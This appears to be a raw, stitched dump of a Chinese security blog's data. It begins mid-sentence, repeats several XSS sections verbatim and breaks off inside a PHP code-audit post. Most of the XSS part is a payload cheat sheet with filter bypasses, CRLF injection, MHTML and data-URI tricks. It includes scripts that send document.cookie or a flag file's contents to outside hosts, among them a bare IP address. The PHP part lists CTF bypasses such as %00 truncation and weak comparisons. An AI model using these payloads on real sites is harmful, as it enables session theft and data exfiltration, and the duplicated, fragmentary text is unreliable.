可以作一句给A(通常是location)赋值B的简单js赋值操作</li>\n<li>利用某些奇怪的HTML标签特性</li>\n</ol>\n<p>比赛时感觉方向1行不通，于是我走了方向2的思路。但方向1还真让某<code>LC↯BC</code>队<a href=\"https://ctftime.org/writeup/5956\">https://ctftime.org/writeup/5956</a> 脑洞出来了个奇葩思路</p>\n<blockquote>\n<p>&lt;svg id=\\ onload=location=id+id+12345609861+domain+id+1234+id </p>\n</blockquote>\n<p>我们（nao）想（dong）出来的payload有如下几个关键点：</p>\n<ol>\n<li>Chrome会把域名中的<code>。</code>（全角句号）理解成<code>.</code></li>\n<li><code>&lt;link rel=import</code>这种标签会把html import到当前页面里….N年前玩polymer的时候常用的一种标签…这里不能用script标签，因为script标签没有正常闭合时引用的js貌似不会被执行</li>\n<li><code>\\\\</code>会被Chrome理解成<code>//</code>，<code>\\</code>也会理解成<code>/</code> （其实这里有个小插曲，我Win10上的Chrome会把<code>\\\\</code>理解成windows资源管理器里敲的那种<code>\\\\</code>也就是samba协议(或<code>file://</code>伪协议)…所以这种payload XSS Windows貌似是不行…?）， 因此<code>\\\\example。com\\xssHtml</code>会变成<code>//example.com/xssHtml</code></li>\n</ol>\n<p>综上，payload:</p>\n<blockquote>\n<p>&lt;link rel=import href=\\example。com\\xssHtml other= </p>\n</blockquote>\n<h2 id=\"RSS中的XSS\"><a href=\"#RSS中的XSS\" class=\"headerlink\" title=\"RSS中的XSS\"></a>RSS中的XSS</h2><p>略</p>\n<h2 id=\"浏览器差异\"><a href=\"#浏览器差异\" class=\"headerlink\" title=\"浏览器差异\"></a>浏览器差异</h2><pre><code class=\"html\">&lt;script type=&quot;text/javascript&quot;&gt;&lt;!--\n    var x = &quot;xssed&lt;/script x\\&gt;&lt;script x\\&gt;alert(/xss/);//&quot;;\n//--&gt;&lt;/script&gt;\n</code></pre>\n<p>Chrome会动态修正一些节点，如将</script>修正为，由于该特性只是按照标签配对，没有考虑HTML注释或其他复杂情况，会导致xss.</p>\n<h2 id=\"img编码绕过\"><a href=\"#img编码绕过\" class=\"headerlink\" title=\"img编码绕过\"></a>img编码绕过</h2><pre><code class=\"html\">&lt;img src=&quot;&quot; onerror=&quot;j&amp;#00097vascript:alert(&#39;xss&#39;);&quot;&gt;\n&lt;img src=&quot;&quot; onerror=&quot;j&amp;#97vascript:alert(&#39;xss1&#39;);&quot;&gt;\n&lt;img src=&quot;&quot; onerror=&quot; javascript:alert(&#39;xss3&#39;);&quot;&gt;\n</code></pre>\n<h2 id=\"a绕过\"><a href=\"#a绕过\" class=\"headerlink\" title=\"a绕过\"></a>a绕过</h2><pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;&lt;&quot;\n</code></pre><h2 id=\"body和div\"><a href=\"#body和div\" class=\"headerlink\" title=\"body和div\"></a>body和div</h2><pre><code>&quot;&gt;&lt;body onload=alert(1)&gt;&lt;&quot;\n&quot;&gt;&lt;div onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;click me&lt;&quot;\n</code></pre><h2 id=\"危险字符\"><a href=\"#危险字符\" class=\"headerlink\" title=\"危险字符\"></a>危险字符</h2><table>\n<thead>\n<tr>\n<th>&lt;</th>\n<th>&amp;lt</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>&gt;</td>\n<td><code>&amp;gt;</code></td>\n</tr>\n<tr>\n<td>&amp;</td>\n<td><code>&amp;amp;</code></td>\n</tr>\n<tr>\n<td>“</td>\n<td><code>&amp;quot;</code></td>\n</tr>\n<tr>\n<td>‘</td>\n<td><code>&amp;#39</code></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"Dom-Based-XSS\"><a href=\"#Dom-Based-XSS\" class=\"headerlink\" title=\"Dom-Based XSS\"></a>Dom-Based XSS</h2><blockquote>\n<p>document.URL</p>\n<p>document.URLUencoded</p>\n<p>document.location(.pathname|.href|.search|.hash)</p>\n<p>window.location(.pathname|.href|.search|.hash)</p>\n<p>document.referrer</p>\n<p>window.name</p>\n<p>document.cookie</p>\n<p>HTML5 postMessage</p>\n<p>localStorage/globalStorage</p>\n<p>XMLHTTPRequest response</p>\n<p>Input.value</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<p>link 标签引入外部 js。</p>\n<pre><code class=\"javascript\">也可以用域名，将 . 用 。 代替。\n&lt;link rel=import href=\\\\八进制ip\n</code></pre>\n<pre><code class=\"javascript\">&lt;script&gt;\n  var xhr = new XMLHttpRequest();\n  xhr.open(&quot;GET&quot;, &quot;https://router.vip/flag.php&quot;, false);\n  xhr.send();\n  a=xhr.responseText;\n  location.href=&#39;https://master.xbfzss.cn/?a=&#39;+escape(a);\n&lt;/script&gt;\n</code></pre>\n<p>xss:<br>jquery版本&gt;=1.9<br>sourceMappingURL加载外部资源</p>\n<script>//# sourceMappingURL=https://xxx.com/?${escape(document.cookie)}</script>\n\n<pre><code>&lt;input name=keyword  value=&quot;&lt;scrilpt&gt;alert(1);&lt;/script&gt;&quot;&gt;\npayload:&quot; onmouseover=alert(1) &quot;\n&lt;input name=keyword  value=&quot;&quot; onmouseover=alert(1) &quot;&quot;&gt;\n</code></pre><pre><code>&lt;input name=keyword  value=&#39;&#39;&gt;\npayload:&#39; onmouseover=alert(1) &#39;\n&lt;input name=keyword  value=&#39; onmouseover=alert(1) &#39;&#39;&gt;\n</code></pre><pre><code>&lt;input name=keyword  value=&quot;&quot;&gt;\n过滤了on\n&lt;input name=keyword  value=&quot;&quot; o_nclick=alert(1) &quot;&quot;&gt;\n\npayload:&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; &gt;as&lt;/a&gt;\n&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; &gt;&lt;/a&gt;&quot;&gt;\n</code></pre><pre><code>&lt;input name=keyword  value=&quot;&quot;&gt;\n过滤了on\n&lt;input name=keyword  value=&quot;&quot; o_nclick=alert(1) &quot;&quot;&gt;\n\npayload:&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; &gt;as&lt;/a&gt;\n&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; &gt;&lt;/a&gt;&quot;&gt;\n</code></pre><p>空格可以使用%0a，%0d绕过</p>\n<p>= onmouseover=alert`1`<br>alert(1)   两边的括号可以使用``替换</p>\n<pre><code>&lt;html&gt;\n&lt;script type=&quot;text/javascript&quot;&gt;\nvar call_window;\ncall_window = window.open(&quot;http://localhost/call.php&quot;);\nsetTimeout(function(){\n    call_window.postMessage({\n      type: &quot;audio&quot;,\n      details: {\n      sender_username: &quot;&lt;img src=xx: onerror=window.open(&#39;http://123.207.90.143/index.php?a=&#39;+document.cookie)&gt;&quot;,\n        sender_team_name: &quot;zzzz&quot;,\n        receiver_username: &quot;test&quot;,\n        receiver_team_name: &quot;test&quot;\n      }\n    }, &quot;*&quot;);\n}, 1000);\n&lt;/script&gt;\n&lt;/html&gt;\n</code></pre><h2 id=\"CRLF-注射攻击（HTTP-ResponseSplitting）-HRS\"><a href=\"#CRLF-注射攻击（HTTP-ResponseSplitting）-HRS\" class=\"headerlink\" title=\"CRLF 注射攻击（HTTP ResponseSplitting）(HRS)\"></a>CRLF 注射攻击（HTTP ResponseSplitting）(HRS)</h2><pre><code class=\"aspx\">nameValueCollection request = Request.QueryString;\nResponse.Cookies[&quot;username&quot;].Value = request[&quot;text&quot;]\n</code></pre>\n<p>正常访问:</p>\n<blockquote>\n<p><a href=\"http://www.test.com/demo.aspx?text=test\" target=\"_blank\" rel=\"noopener\">http://www.test.com/demo.aspx?text=test</a></p>\n</blockquote>\n<p>正常情况下，会使用text=test来setcookie</p>\n<p>payload:</p>\n<blockquote>\n<p><a href=\"http://www.test.com/demo.aspx?text=a%0D%0ASet-Cookie%03A020HackedCookie=Hacked\" target=\"_blank\" rel=\"noopener\">http://www.test.com/demo.aspx?text=a%0D%0ASet-Cookie%03A020HackedCookie=Hacked</a></p>\n</blockquote>\n<p>正常情况下：HTTP Response如下:</p>\n<blockquote>\n<p>HTTP/1.1 200 OK</p>\n<p>Set-Cookie: userName=test</p>\n<p>Content-Type: text/html; charset-utf-8</p>\n</blockquote>\n<p>使用payload的情况下:</p>\n<blockquote>\n<p>HTTP/1.1 200 OK</p>\n<p>Set-Cookie: username=a</p>\n<p>Set-Cookie: HackedCookie=Hacked</p>\n<p>Content-Type: text/html; charset-utf8</p>\n</blockquote>\n<p>更严重的情况下:</p>\n<p>payload:</p>\n<blockquote>\n<p><a href=\"http://www.test.com/page.php?page=%0d%0aContent-Type\" target=\"_blank\" rel=\"noopener\">http://www.test.com/page.php?page=%0d%0aContent-Type</a>: text/html%0D%0AHTTP/1.1 200 OK %0D%0AContent-Type: text/html%0D%0A%0D%0A%3Chtml%3EHacker Content%3C/html%3E</p>\n</blockquote>\n<p>该代码明显恶意，但是浏览器也会执行。</p>\n<h2 id=\"MHTML协议安全-IE浏览器\"><a href=\"#MHTML协议安全-IE浏览器\" class=\"headerlink\" title=\"MHTML协议安全[IE浏览器]\"></a>MHTML协议安全[IE浏览器]</h2><p>MHTML协议格式:</p>\n<blockquote>\n<p>mhtml: [Mhtml_File_Url]![Original_Resource_Url]</p>\n</blockquote>\n<p>新建一个HTML文件，demo.html</p>\n<pre><code class=\"html\">Content-Type: multipart/related; boundary=&quot;_boundary_by_mere&quot;\n\n--_boundary_by_mere\nCotent-Location: demo\nContent-Transfer-Encoding: base64\n\nPHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ=\n--_boundary_by_mere--\n</code></pre>\n<p>当使用如下链接进行访问的时候，就会弹窗：</p>\n<blockquote>\n<p>mhtml:<a href=\"http://127.0.0.1/demo.html!demo\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/demo.html!demo</a></p>\n</blockquote>\n<p>注意:为了让IE调用MHTML Protocol Handler将该资源当做MHTML格式文件解析处理，需要把URL修改为MHTML协议，在”http”之前加上”mhtml:”，在url后边加上”!demo”字样。</p>\n<p>此外，还可以结合CRLF漏洞实现XSS。</p>\n<p>首先PHP脚本如下(test.php):</p>\n<pre><code class=\"php\">&lt;?php\n    echo $_GET[&#39;k&#39;];\n?&gt;\n</code></pre>\n<p>构造url:</p>\n<blockquote>\n<p>mhtml:<a href=\"http://127.0.0.1/test.php?k=ax%250AContent-Type%3A%20multipart%2frelated%3B%20boundary%3D%22_boundary_by_mere%22%250D%250A--_boundary_by_mere%250D%250ACotent-Location%3A%20xss%250D%250AContent-Transfer-Encoding%3A%20base64%250D%250A%250D%250APHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ%3D%250D%250A--_boundary_by_mere--!xss\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/test.php?k=ax%250AContent-Type%3A%20multipart%2frelated%3B%20boundary%3D%22_boundary_by_mere%22%250D%250A--_boundary_by_mere%250D%250ACotent-Location%3A%20xss%250D%250AContent-Transfer-Encoding%3A%20base64%250D%250A%250D%250APHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ%3D%250D%250A--_boundary_by_mere--!xss</a></p>\n</blockquote>\n<h2 id=\"利用Data-URIs进行XSS\"><a href=\"#利用Data-URIs进行XSS\" class=\"headerlink\" title=\"利用Data URIs进行XSS\"></a>利用Data URIs进行XSS</h2><p>该方案和MHTML有些类似。Data URI格式如下:</p>\n<blockquote>\n<p> data:[<mime type=\"\">][;charset=<charset>][;base64],<encoded data=\"\"></encoded></charset></mime></p>\n<p>data指代URI协议</p>\n<p>mime type 代表数据类型，如PNG图片则为image/png,若无说明，默认为text/plain</p>\n<p>charset 如果不适用base64，则使用charset指定的字符类型</p>\n<p>encoded data 对应的编码信息</p>\n</blockquote>\n<p>例如:</p>\n<pre><code class=\"html\">&lt;img src=&quot;data:image/gif;base64,R0lGODlhMwAxAIAAAAAAAP///\nyH5BAAAAAAALAAAAAAzADEAAAK8jI+pBr0PowytzotTtbm/DTqQ6C3hGX\nElcraA9jIr66ozVpM3nseUvYP1UEHF0FUUHkNJxhLZfEJNvol06tzwrgd\nLbXsFZYmSMPnHLB+zNJFbq15+SOf50+6rG7lKOjwV1ibGdhHYRVYVJ9Wn\nk2HWtLdIWMSH9lfyODZoZTb4xdnpxQSEF9oyOWIqp6gaI9pI1Qo7BijbF\nZkoaAtEeiiLeKn72xM7vMZofJy8zJys2UxsCT3kO229LH1tXAAAOw==&quot;&gt;\n</code></pre>\n<p>XSS隐患，执行XSS最常用的方法是引入<script>标签，如果过滤，就没有办法使用了。</p>\n<blockquote>\n<p>\\<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"\\>test\\</a\\></p>\n</blockquote>\n<p>其中:</p>\n<blockquote>\n<p>PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+</p>\n</blockquote>\n<p>解码后:</p>\n<blockquote>\n<p>\\<script\\>alert(‘xss’);\\</script\\></p>\n</blockquote>\n<p>这种方法，现在不支持，同样不支持的还有<meta>标签，  chrome和firefox都会禁止。  </p>\n<blockquote>\n <meta http-equiv=\"Refresh\" content=\"0; URL=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\">\n\n</blockquote>\n<p><object>则可以使用,<iframe>也行。</p>\n<blockquote>\n<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"></object>\n\n<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"></iframe>\n\n</blockquote>\n<h2 id=\"simple-xss\"><a href=\"#simple-xss\" class=\"headerlink\" title=\"simple xss\"></a>simple xss</h2><p>XSS payload只允许使用大小写字母数字加上<code>&lt;^*~\\-|_=+</code>这些特殊符号，那么大概只有两种方案：</p>\n<ol>\n<li>利用onload=A=B 可以作一句给A(通常是location)赋值B的简单js赋值操作</li>\n<li>利用某些奇怪的HTML标签特性</li>\n</ol>\n<p>比赛时感觉方向1行不通，于是我走了方向2的思路。但方向1还真让某<code>LC↯BC</code>队<a href=\"https://ctftime.org/writeup/5956\">https://ctftime.org/writeup/5956</a> 脑洞出来了个奇葩思路</p>\n<blockquote>\n<p>&lt;svg id=\\ onload=location=id+id+12345609861+domain+id+1234+id </p>\n</blockquote>\n<p>我们（nao）想（dong）出来的payload有如下几个关键点：</p>\n<ol>\n<li>Chrome会把域名中的<code>。</code>（全角句号）理解成<code>.</code></li>\n<li><code>&lt;link rel=import</code>这种标签会把html import到当前页面里….N年前玩polymer的时候常用的一种标签…这里不能用script标签，因为script标签没有正常闭合时引用的js貌似不会被执行</li>\n<li><code>\\\\</code>会被Chrome理解成<code>//</code>，<code>\\</code>也会理解成<code>/</code> （其实这里有个小插曲，我Win10上的Chrome会把<code>\\\\</code>理解成windows资源管理器里敲的那种<code>\\\\</code>也就是samba协议(或<code>file://</code>伪协议)…所以这种payload XSS Windows貌似是不行…?）， 因此<code>\\\\example。com\\xssHtml</code>会变成<code>//example.com/xssHtml</code></li>\n</ol>\n<p>综上，payload:</p>\n<blockquote>\n<p>&lt;link rel=import href=\\example。com\\xssHtml other= </p>\n</blockquote>\n<h2 id=\"RSS中的XSS\"><a href=\"#RSS中的XSS\" class=\"headerlink\" title=\"RSS中的XSS\"></a>RSS中的XSS</h2><p>略</p>\n<h2 id=\"浏览器差异\"><a href=\"#浏览器差异\" class=\"headerlink\" title=\"浏览器差异\"></a>浏览器差异</h2><pre><code class=\"html\">&lt;script type=&quot;text/javascript&quot;&gt;&lt;!--\n    var x = &quot;xssed&lt;/script x\\&gt;&lt;script x\\&gt;alert(/xss/);//&quot;;\n//--&gt;&lt;/script&gt;\n</code></pre>\n<p>Chrome会动态修正一些节点，如将</script>修正为，由于该特性只是按照标签配对，没有考虑HTML注释或其他复杂情况，会导致xss.</p>\n<h2 id=\"img编码绕过\"><a href=\"#img编码绕过\" class=\"headerlink\" title=\"img编码绕过\"></a>img编码绕过</h2><pre><code class=\"html\">&lt;img src=&quot;&quot; onerror=&quot;j&amp;#00097vascript:alert(&#39;xss&#39;);&quot;&gt;\n&lt;img src=&quot;&quot; onerror=&quot;j&amp;#97vascript:alert(&#39;xss1&#39;);&quot;&gt;\n&lt;img src=&quot;&quot; onerror=&quot; javascript:alert(&#39;xss3&#39;);&quot;&gt;\n</code></pre>\n<h2 id=\"a绕过\"><a href=\"#a绕过\" class=\"headerlink\" title=\"a绕过\"></a>a绕过</h2><pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;&lt;&quot;\n</code></pre><h2 id=\"body和div\"><a href=\"#body和div\" class=\"headerlink\" title=\"body和div\"></a>body和div</h2><pre><code>&quot;&gt;&lt;body onload=alert(1)&gt;&lt;&quot;\n&quot;&gt;&lt;div onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;click me&lt;&quot;\n</code></pre><h2 id=\"危险字符\"><a href=\"#危险字符\" class=\"headerlink\" title=\"危险字符\"></a>危险字符</h2><table>\n<thead>\n<tr>\n<th>&lt;</th>\n<th>&amp;lt</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>&gt;</td>\n<td><code>&amp;gt;</code></td>\n</tr>\n<tr>\n<td>&amp;</td>\n<td><code>&amp;amp;</code></td>\n</tr>\n<tr>\n<td>“</td>\n<td><code>&amp;quot;</code></td>\n</tr>\n<tr>\n<td>‘</td>\n<td><code>&amp;#39</code></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"Dom-Based-XSS\"><a href=\"#Dom-Based-XSS\" class=\"headerlink\" title=\"Dom-Based XSS\"></a>Dom-Based XSS</h2><blockquote>\n<p>document.URL</p>\n<p>document.URLUencoded</p>\n<p>document.location(.pathname|.href|.search|.hash)</p>\n<p>window.location(.pathname|.href|.search|.hash)</p>\n<p>document.referrer</p>\n<p>window.name</p>\n<p>document.cookie</p>\n<p>HTML5 postMessage</p>\n<p>localStorage/globalStorage</p>\n<p>XMLHTTPRequest response</p>\n<p>Input.value</p>\n</blockquote>\n"},{"title":"PHP代码审计归纳","date":"2018-04-18T02:27:37.000Z","_content":"\n\n\n# PHP代码审计归纳\n\nAuthor: 木禾 ali0th\n\nhttps://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md\n## 变量覆盖\n### extract()\n该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。条件：若有EXTR_SKIP则不行。\n```php\n<?php\n$a = \"Original\";\n$my_array = array(\"a\" => \"Cat\",\"b\" => \"Dog\", \"c\" => \"Horse\");\nextract($my_array); \necho \"\\$a = $a; \\$b = $b; \\$c = $c\";\n?>\n# 结果：$a = Cat; $b = Dog; $c = Horse\n\n```\n这里原来是\\$a是original，后面通过extract把$a覆盖变成了Cat了,所以这里把原来的变量给覆盖了。\n\n```php\n#?shiyan=&flag=1\n<?php\n$flag='xxx'; \nextract($_GET);\n if(isset($shiyan))\n { \n    $content=trim(file_get_contents($flag)); # content is 0 , flag can be anything,cause file_get_contents cannot open file, return 0\n    if($shiyan==$content)\n    { \n        echo 'ctf{xxx}'; \n    }\n   else\n   { \n    echo'Oh.no';\n   } \n   }\n```\n<!--more-->\n### parse_str()\n\n解析字符串并注册成变量\n```php\n$b=1;\nParse_str('b=2');\nPrint_r($b);\n# 结果: $b=2\n```\n\n### import_request_variables()\n\n```php\n将 GET/POST/Cookie 变量导入到全局作用域中，全局变量注册。\n在5.4之后被取消，只可在4-4.1.0和5-5.4.0可用。\n//导入POST提交的变量值，前缀为post_\nimport_request_variable(\"p\"， \"post_\");\n//导入GET和POST提交的变量值，前缀为gp_，GET优先于POST\nimport_request_variable(\"gp\"， \"gp_\");\n//导入Cookie和GET的变量值，Cookie变量值优先于GET\nimport_request_variable(\"cg\"， \"cg_\");\n```\n\n### $变量覆盖\n\n```php\n## 提交参数chs，则可覆盖变量\"$chs\"的值。$key为chs时，$$key就变成$chs\n<?  \n$chs = '';  \nif($_POST && $charset != 'utf-8'){  \n    $chs = new Chinese('UTF-8', $charset);  \n    foreach($_POST as $key => $value){  \n        $$key = $chs->Convert($value);  \n    }  \n    unset($chs);  \n} \n```\n\n### 全局变量覆盖漏洞\n\n原理：\nregister_globals 是php中的一个控制选项，可以设置成off或者on, 默认为off, 决定是否将 EGPCS（Environment，GET，POST，Cookie，Server）变量注册为全局变量。\n如果register_globals打开的话, 客户端提交的数据中含有GLOBALS变量名, 就会覆盖服务器上的$GLOBALS变量.\n\n\\$_REQUEST 这个超全局变量的值受 php.ini中request_order的影响，在php5.3.x系列中，request_order默认值为GP，也就是说默认配置下$_REQUEST只包含$_GET和$_POST而不包括$_COOKIE。通过COOKIE就可以提交GLOBALS变量。\n\n```php\n<?php\n// register_globals =ON\n//foo.php?GLOBALS[foobar]=HELLO\necho $foobar;\n\n//为了安全取消全局变量\n//var.php?GLOBALS[a]=aaaa&b=111\nif (ini_get(\"register_globals\")) foreach($_REQUEST as $k=>$v) unset(${$k});\nprint $a;\nprint $_GET[b]; \n```\n经过测试，开了register_globals会卡死\n\n\n## 绕过过滤的空白字符\n\n原理：https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6\n\n```\n控制码\n\"\\0\" \"%00\" (ASCII  0 (0x00))，空字节符。\n\n制表符\n\"\\t\" (ASCII  9 (0x09))，水平制表符。\n\n空白字符：\n\"\\n\" (ASCII 10 (0x0A))，换行符。\n\"\\v\" \"\\x0b\" (ASCII  11 (0x0B))，垂直制表符。\n\"\\f\" \"%0c\" 换页符\n\"\\r\" \"%0d\"(ASCII  13 (0x0D))，回车符。\n\n空格:\n\" \" \"%20\" (ASCII  32 (0x20))，普通空格符。\n```\n\n而trim过滤的空白字符有\n```php\nstring trim ( string $str [, string $character_mask = \" \\t\\n\\r\\0\\x0B\" ] )\n```\n其中缺少了\\f\n\n2 函数对空白字符的特性\nis_numeric函数在开始判断前，会先跳过所有空白字符。这是一个特性。\n也就是说，is_numeirc(\" \\r\\n \\t 1.2\")是会返回true的。同理，intval(\" \\r\\n \\t 12\")，也会正常返回12。\n\n\n\n案例\n\nhttps://github.com/bowu678/php_bugs/blob/master/02%20%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6.php\n```php\n#?number=%00%0c191\n# 1 %00绕过is_numeric\n# 2 \\f（也就是%0c）在数字前面，trim，intval和is_numeric都会忽略这个字符\n```\n\n## intval整数溢出\n\nphp整数上限溢出绕过intval\n\nintval 函数最大的值取决于操作系统。 \n32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval('1000000000000') 会返回 2147483647。\n64 位系统上，最大带符号的 integer 值是 9223372036854775807。\n\n## intval 四舍五入\n\n\n```php\n# ?a=1024.1\n<?php\nif($_GET[id]) {\nmysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\nmysql_select_db(SAE_MYSQL_DB);\n$id = intval($_GET[id]); ## 这里过滤只有一个intval\n$query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\"));\nif ($_GET[id]==1024) {\n    echo \"<p>no! try again</p>\";\n    }\n  else{\n    echo($query[content]);\n  }\n}\n```\n\n## 浮点数精度忽略\n```php\nif ($req[\"number\"] != intval($req[\"number\"]))\n```\n在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。\n输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等。\n\n\n\n\n## 多重加密\n\n\n题目中有：\n```php\n$login = unserialize(gzuncompress(base64_decode($requset['token'])));\nif($login['user'] === 'ichunqiu'){echo $flag;}\n```\n本地则写：\n```php\n<?php\n$arr = array(['user'] === 'ichunqiu');\n$token = base64_encode(gzcompress(serialize($arr)));\nprint_r($token);\n// 得到eJxLtDK0qs60MrBOAuJaAB5uBBQ=\n?>\n```\n\n## 截断\n\n### iconv 异常字符截断\n\n```php\n## 因iconv遇到异常字符就不转后面的内容了，所以可以截断。\n## 这里chr(128)到chr(255)都可以截断。\n$a='1'.char(130).'2';\necho iconv(\"UTF-8\",\"gbk\",$a); //将字符串的编码从UTF-8转到gbk\necho iconv('GB2312', 'UTF-8', $str); //将字符串的编码从GB2312转到UTF-8\n```\n\n### eregi、ereg可用%00截断\n\n功能：正则匹配过滤\n条件：要求php<5.3.4\n\n```php\n## http://127.0.0.1/Php_Bug/05.php?password=1e9%00*-*\n#GET方式提交password，然后用ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母，继续strlen()限制了长度小于8并且大小必须大于9999999，继续strpos()对password进行匹配，必须含有-，最终才输出flag\n#因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。\n#对于另一个难题可以使用科学计数法表示，计算器或电脑表达10的的幂是一般是e，也就是1.99714e13=19971400000000，所以构造 1e8 即 100000000 > 9999999，在加上-。于是乎构造password=1e8%00*-*,成功得到答案\n<?php\nif (isset ($_GET['password'])) {\n    if (ereg (\"^[a-zA-Z0-9]+$\",$_GET['password']) === FALSE)    \n       {\n        echo '<p>You password must be alphanumeric</p>';\n    }\n    else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)\n    {\n        if (strpos ($_GET['password'], '*-*') !== FALSE)\n        {\n            die('Flag: ' . $flag);\n        }\n        else\n        {\n            echo('<p>*-* have not been found</p>');\n        }\n    }\n    else\n    {\n        echo '<p>Invalid password</p>';\n    }\n}\n```\n\n\n### move_uploaded_file 用\\0截断\n5.4.x<= 5.4.39, 5.5.x<= 5.5.23, 5.6.x <= 5.6.7\n原来在高版本（受影响版本中），PHP把长度比较的安全检查逻辑给去掉了，导致了漏洞的发生\ncve：\nhttps://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348\n\n`move_uploaded_file($_FILES['x']['tmp_name'],\"/tmp/test.php\\x00.jpg\")`\n上传抓包修改name为a.php\\0jpg（\\0是nul字符），可以看到$_FILES['xx']['name']存储的字符串是a.php，不会包含\\0截断之后的字符，因此并不影响代码的验证逻辑。\n但是如果通过$_REQUEST方式获取的，则可能出现扩展名期望值不一致的情况，造成“任意文件上传”。\n\n### include用？截断\n\n```php\n<?php\n$name=$_GET['name'];  \n$filename=$name.'.php';  \ninclude $filename;  \n?>\n```\n当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。\n测试POC：\nhttp://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt?\n则会打开secret.txt中的文件内容。本测试用例在PHP5.5.38版本上测试通过。\n\n### 系统长度截断\n这种方式在PHP5.3以后的版本中都已经得到了修复。\nwin260个字符，linux下4*1024=4096字节\n\n### mysql长度截断\nmysql内的默认字符长度为255，超过的就没了。\n由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning\n\n### mysql中utf-8截断\n\n`insert into dvwa.test values (14,concat(\"admin\",0xc1,\"abc\"))`\n\n写入为admin\n\n\n## 弱类型比较\n\n原理\n\n比较表：http://php.net/manual/zh/types.comparisons.php\n\n以下等式会成立\n```php\n'' == 0 == false\n'123' == 123\n'abc' == 0\n'123a' == 123\n'0x01' == 1\n'0e123456789' == '0e987654321'\n[false] == [0] == [NULL] == ['']\nNULL == false == 0\ntrue == 1\n```\n\n### ==、>、<的弱类型比较\n\n这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型转换成整型再比。\n\n```php\n##方法1\n##$a[\"a1\"]=\"1e8%00\";\n##这里用%00绕过is_numeric,然后1e8可以比1336大，因此最后能$v1=1\n##方法2\n##$a[\"a1\"]=[\"a\"];\n##使用数组，可以，因为数组恒大于数字或字符串\n##方法3\n##$a[\"a1\"]=1337a;\n##1337a过is_numeric，又由>转成1337与1336比较\n<?php\nis_numeric(@$a[\"a1\"])?die(\"nope\"):NULL;    \nif(@$a[\"a1\"]){\n\t\tvar_dump($a);\n        ($a[\"a1\"]>1336)?$v1=1:NULL;\n}\nvar_dump($v1);\n```\n\n### switch 弱类型\n```php\n// 第一种：弱类型，1e==1\n// $x1=1e\n// 第二种：利用数组名字bypass\n// $x1=1[]\n// 传入后为string(3) \"1[]\",但在switch那里为1\nif (isset($_GET['x1']))\n{ \n        $x1 = $_GET['x1']; \n        $x1==\"1\"?die(\"ha?\"):NULL; \n        switch ($x1) \n        { \n        case 0: \n        case 1: \n                $a=1; \n                break; \n        } \n}\n```\n\n### md5比较（0e相等、数组为Null）\n```php\nmd5('240610708') //0e462097431906509019562988736854\nmd5('QNKCDZO') //0e830400451993494058024219903391\n0e 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换。\nmd5('240610708')==md5('QNKCDZO'); //True\nmd5('240610708')===md5('QNKCDZO'); //False\n\n这样的对应数值还有：\nvar_dump(md5('240610708') == md5('QNKCDZO'));\nvar_dump(md5('aabg7XSs') == md5('aabC9RqS'));\nvar_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));\nvar_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));\nvar_dump('0010e2' == '1e3');\nvar_dump('0x1234Ab' == '1193131');\nvar_dump('0xABCdef' == ' 